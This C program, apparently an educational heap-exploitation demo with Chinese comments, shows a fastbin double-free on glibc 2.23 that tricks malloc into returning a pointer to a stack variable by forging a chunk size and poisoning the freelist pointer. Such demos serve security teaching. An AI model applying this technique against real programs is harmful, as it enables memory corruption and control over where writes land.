#include <stdio.h>
#include <stdlib.h>

/*
 *需要glibc版本=2.23 export LD_PRELOAD="./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6"
 */

int main()
{
	fprintf(stderr, "本文件在fastbin_dup.c的基础上扩展了欺骗malloc使其返回一个指向受控区域的指针，如本例中的返回一个指向栈内存的指针.\n");

	unsigned long long stack_var;

	fprintf(stderr, "我们想让malloc()返回的地址是栈上的 %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "malloc三个内存.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "第一次1st malloc(8): %p\n", a);
	fprintf(stderr, "第二次2nd malloc(8): %p\n", b);
	fprintf(stderr, "第三次3rd malloc(8): %p\n", c);

	fprintf(stderr, "Free第一个内存...\n");
	free(a);

	fprintf(stderr,"如果我们再次free %p, 程序会崩溃，因为 %p 在freelist的第一个.\n", a, a);
	// free(a);

    fprintf(stderr,"所以我们来free第二块内存 %p.\n", b);
	free(b);

	fprintf(stderr,"现在我们就可以再次free %p 了，因为他不是“上次”释放的内存了.\n", a);
	free(a);

	fprintf(stderr, "现在free list有 [ %p, %p, %p ]. 我们现在通过修改 %p 指向的数据继续攻击.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "第一次1st malloc(8): %p\n", d);
	fprintf(stderr, "第二次2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "现在free list有 [ %p ].\n", a);
	fprintf(stderr, "现在我们可以访问到 %p ，同时它还在free list的第一位.\n"
		"所以我们向栈中写入一个伪造的free size (在这里是0x20) ,\n"
		"这样malloc就会认为这里是一个空闲的内存，并且分配一个指向这里的指针\n", a);
	stack_var = 0x20;

	fprintf(stderr, "现在我们复写 %p 指向数据的前8 byte，让他们正好位于0x20之前.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "第三次3rd malloc(8): %p, 使栈上地址进入free list\n", malloc(8));
	fprintf(stderr, "第四次4th malloc(8): %p 这个地址是栈上stack_var的地址\n", malloc(8));
}
